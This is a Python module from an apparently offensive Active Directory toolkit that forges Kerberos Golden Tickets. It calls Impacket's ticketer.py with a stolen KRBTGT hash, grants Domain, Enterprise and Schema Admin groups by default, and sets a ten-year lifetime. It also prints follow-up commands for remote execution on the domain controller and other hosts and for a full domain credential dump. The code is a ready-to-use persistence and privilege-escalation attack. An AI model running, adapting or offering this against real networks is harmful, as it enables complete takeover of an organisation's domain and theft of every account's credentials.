"""
Golden Ticket — Forge a TGT signed with the KRBTGT hash.

Creates a completely valid TGT that the KDC will accept.
You can impersonate ANY user (even non-existent ones).

Requirements:
    - KRBTGT hash (from DCSync: secretsdump.py -just-dc-user krbtgt)
    - Domain SID
    - Target username and RID (500=Administrator, or any RID)

Group RIDs in default groups string:
    512 = Domain Admins, 513 = Domain Users,
    518 = Schema Admins, 519 = Enterprise Admins,
    520 = Group Policy Creator Owners
"""

import os
import subprocess
from pathlib import Path
from typing import List

from ..utils.ticket_utils import TicketInspector
from ..utils.commands import CommandReference


class GoldenTicket:
    """Forge Golden Tickets via Impacket ticketer.py."""

    DEFAULT_GROUPS = "512,513,518,519,520"
    DEFAULT_DURATION = 87600  # ~10 years

    def __init__(self, domain: str, dc_ip: str, domain_sid: str, output_dir: Path):
        self.domain = domain
        self.dc_ip = dc_ip
        self.domain_sid = domain_sid
        self.output_dir = output_dir

    def forge(
        self,
        username: str,
        user_id: int,
        krbtgt_hash: str,
        krbtgt_aes256: str = "",
        groups: str = "",
        duration: int = 0,
    ) -> str:
        """
        Forge a Golden Ticket TGT.

        Returns the path to the .ccache file on success, empty string on failure.
        """
        groups = groups or self.DEFAULT_GROUPS
        duration = duration or self.DEFAULT_DURATION

        print(f"\n{'=' * 60}")
        print("GOLDEN TICKET FORGING")
        print(f"{'=' * 60}")

        if not self.domain_sid:
            print("[-] Domain SID required. Run get_domain_sid() first.")
            return ""

        print(f"[*] Forging TGT for: {self.domain}\\{username}")
        print(f"[*] User RID: {user_id}")
        print(f"[*] Domain SID: {self.domain_sid}")
        print(f"[*] Groups: {groups}")
        print(f"[*] Duration: {duration} hours ({duration // 8760} years)")

        ccache_file = str(self.output_dir / f"golden_{username}.ccache")
        cmd = self._build_command(
            username, user_id, krbtgt_hash, krbtgt_aes256, groups, duration
        )

        try:
            print(f"[*] Executing: {' '.join(cmd)}")
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=30
            )

            default_ccache = f"{username}.ccache"
            if os.path.exists(default_ccache):
                os.rename(default_ccache, ccache_file)

            if os.path.exists(ccache_file):
                self._print_success(ccache_file, username, user_id, duration)
                TicketInspector.print_info(ccache_file)
                return ccache_file

            print("[-] Golden Ticket creation failed")
            if result.stderr:
                print(f"    Error: {result.stderr[:300]}")
            return ""

        except FileNotFoundError:
            print("[-] ticketer.py not found")
            CommandReference.print_golden_alternatives(
                self.domain, self.dc_ip, self.domain_sid,
                username, user_id, krbtgt_hash, krbtgt_aes256, groups,
            )
            return ""
        except Exception as e:
            print(f"[-] Golden Ticket failed: {e}")
            return ""

    def _build_command(
        self, username: str, user_id: int, krbtgt_hash: str,
        krbtgt_aes256: str, groups: str, duration: int,
    ) -> List[str]:
        """Build the ticketer.py command for Golden Ticket forging."""
        if krbtgt_aes256:
            print("[*] Using AES256 key (stealthier — matches domain encryption)")
            key_args = ["-aesKey", krbtgt_aes256]
        else:
            key_args = ["-nthash", krbtgt_hash]

        return [
            "ticketer.py",
            *key_args,
            "-domain-sid", self.domain_sid,
            "-domain", self.domain,
            "-user-id", str(user_id),
            "-groups", groups,
            "-duration", str(duration),
            username,
        ]

    def _print_success(
        self, ccache_file: str, username: str, user_id: int, duration: int
    ):
        print(f"\n[+] ★ GOLDEN TICKET FORGED ★")
        print(f"[+] Saved to: {ccache_file}")
        print(f"[+] Valid for: {duration} hours")
        print(f"[+] Impersonating: {self.domain}\\{username} (RID {user_id})")
        print(f"[+] Groups: Domain Admins, Enterprise Admins, Schema Admins")

        print(f"\n[*] Usage:")
        print(f"    export KRB5CCNAME={ccache_file}")
        print(f"    wmiexec.py {self.domain}/{username}@{self.dc_ip} -k -no-pass")
        print(f"    secretsdump.py {self.domain}/{username}@{self.dc_ip} -k -no-pass -just-dc")
        print(f"    psexec.py {self.domain}/{username}@<any_target> -k -no-pass")